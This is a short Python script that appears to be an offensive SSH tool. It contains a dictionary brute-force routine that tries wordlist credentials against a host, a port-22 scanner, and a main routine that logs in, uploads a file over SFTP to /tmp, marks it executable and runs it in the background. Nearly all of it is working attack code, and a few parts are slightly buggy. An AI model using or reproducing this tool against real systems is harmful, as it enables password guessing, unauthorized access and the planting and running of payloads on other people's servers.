import socket
import subprocess
from datetime import datetime
import paramiko
import sys

def AttackSSH(ipAddress, dictionaryFile) :
    print ( "[+] Attacking Host : %s " %ipAddress )
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for line in open(dictionaryFile, "r").readlines() :
        [username, password] = line.strip().split()
        try :
            print("[+] Trying to break in with username: %s password: %s " % (username, password))
            ssh.connect(ipAddress, username=username, password=password)
        except paramiko.AuthenticationException:
            print("[-] Failed! ...")
            continue
        print("[+] Success ... username: %s and passoword %s is VALID! " % (username, password))
        break

def sshScan ():
    ## Clear the screen
    subprocess.call('clear', shell=True)

    ## Enter Host to scan
    remoteServer = input("Enter a remote host to scan: ")
    remoteServerIP = socket.gethostbyname(remoteServer)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((remoteServerIP, 22))
    
    if result == 0:
        ## if a socket is listening it will print out the port number
        sock.close()
        return result

def UploadFileAndExecute(sshConnection, fileName) :
    sftpClient = ssh.open_sftp()
    sftpClient.put(fileName, "/tmp/" +fileName)
    ssh.exec_command("chmod a+x /tmp/" +fileName)
    ssh.exec_command("nohup /tmp/" +fileName+ " &")

if __name__ == "__main__" :
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(sys.argv[1], username=sys.argv[2], password=sys.argv[3])
    UploadFileAndExecute(ssh, sys.argv[4])
    ssh.close()
